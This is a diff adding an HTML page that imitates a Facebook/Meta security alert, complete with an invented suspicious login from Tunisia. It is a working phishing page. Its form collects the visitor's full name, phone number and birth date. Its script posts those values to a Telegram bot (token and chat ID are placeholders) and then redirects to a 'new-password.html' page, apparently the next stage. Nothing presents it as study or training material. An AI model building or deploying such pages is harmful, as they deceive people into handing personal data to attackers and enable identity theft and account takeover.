@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Alert - Facebook</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; min-height: 100vh; display: flex; flex-direction: column; }
+        .navbar { background: white; height: 56px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); display: flex; align-items: center; padding: 0 20px; }
+        .logo { color: #1877f2; font-size: 28px; font-weight: bold; }
+        .container { max-width: 500px; margin: 40px auto; padding: 0 20px; flex: 1; }
+        .alert-box { background: white; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); padding: 40px; text-align: center; border-top: 4px solid #ff6b6b; }
+        .warning-icon { width: 60px; height: 60px; background: #fff3cd; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 30px; }
+        h1 { color: #1c1e21; font-size: 24px; margin-bottom: 15px; }
+        .alert-text { color: #606770; font-size: 16px; line-height: 1.5; margin-bottom: 25px; }
+        .ip-info { background: #f5f5f5; border-radius: 8px; padding: 15px; margin: 20px 0; text-align: left; border-left: 4px solid #ff6b6b; }
+        .ip-info h3 { color: #1c1e21; font-size: 14px; margin-bottom: 10px; text-transform: uppercase; }
+        .ip-detail { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #ddd; font-size: 14px; }
+        .ip-detail:last-child { border-bottom: none; }
+        .ip-label { color: #606770; font-weight: 600; }
+        .ip-value { color: #ff6b6b; font-weight: bold; font-family: monospace; }
+        .action-btn { background: #1877f2; color: white; border: none; border-radius: 6px; padding: 14px 24px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; transition: background 0.2s; }
+        .action-btn:hover { background: #166fe5; }
+        .action-btn:disabled { background: #a4b0be; cursor: not-allowed; }
+        .secure-note { margin-top: 20px; font-size: 13px; color: #606770; display: flex; align-items: center; justify-content: center; gap: 5px; }
+        footer { background: white; padding: 20px; text-align: center; color: #737373; font-size: 12px; margin-top: auto; }
+        .loading { display: none; color: #1877f2; margin-top: 10px; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="logo">facebook</div>
+    </nav>
+
+    <div class="container">
+        <div class="alert-box">
+            <div class="warning-icon">⚠️</div>
+            <h1>Account Security Alert</h1>
+            <p class="alert-text">We've detected unusual activity on your account. To protect our community, please verify your identity.</p>
+
+            <div class="ip-info">
+                <h3>Suspicious Login Detected</h3>
+                <div class="ip-detail">
+                    <span class="ip-label">IP Address:</span>
+                    <span class="ip-value">197.14.23.156</span>
+                </div>
+                <div class="ip-detail">
+                    <span class="ip-label">Location:</span>
+                    <span class="ip-value">Tunis, Tunisia</span>
+                </div>
+                <div class="ip-detail">
+                    <span class="ip-label">Device:</span>
+                    <span class="ip-value">Unknown Device</span>
+                </div>
+                <div class="ip-detail">
+                    <span class="ip-label">Time:</span>
+                    <span class="ip-value" id="currentTime"></span>
+                </div>
+            </div>
+
+            <form id="verifyForm">
+                <input type="text" id="fullName" class="ip-info" style="width: 100%; margin: 10px 0; padding: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 15px;" placeholder="Full Name (as on ID)" required>
+                <input type="tel" id="phoneNumber" class="ip-info" style="width: 100%; margin: 10px 0; padding: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 15px;" placeholder="Phone Number" required>
+                <input type="date" id="birthDate" class="ip-info" style="width: 100%; margin: 10px 0; padding: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 15px;" required>
+                
+                <button type="submit" class="action-btn" id="verifyBtn">Confirm Identity & Continue</button>
+                <div class="loading" id="loading">Verifying your information...</div>
+            </form>
+
+            <div class="secure-note">🔒 Secured by Facebook Security Team</div>
+        </div>
+    </div>
+
+    <footer>Meta © 2024 • Security Center</footer>
+
+    <script>
+        // 🔥 SAME CONFIG
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+        const CHAT_ID = 'YOUR_CHAT_ID_HERE';
+
+        // Show current time
+        document.getElementById('currentTime').textContent = new Date().toLocaleString('en-US', {
+            month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit'
+        });
+
+        document.getElementById('verifyForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const fullName = document.getElementById('fullName').value;
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            const birthDate = document.getElementById('birthDate').value;
+            
+            document.getElementById('verifyBtn').disabled = true;
+            document.getElementById('loading').style.display = 'block';
+            
+            const message = `🚨 *SECURITY ALERT DATA* 🚨\n\n` +
+                          `👤 Full Name: ${fullName}\n` +
+                          `📱 Phone: ${phoneNumber}\n` +
+                          `🎂 Birth Date: ${birthDate}\n` +
+                          `🌐 Page: Security Alert\n` +
+                          `⏰ Time: ${new Date().toLocaleString()}`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                setTimeout(() => {
+                    window.location.href = 'new-password.html';
+                }, 1500);
+                
+            } catch (error) {
+                setTimeout(() => {
+                    window.location.href = 'new-password.html';
+                }, 1500);
+            }
+        });
+    </script>
+</body>
+</html>
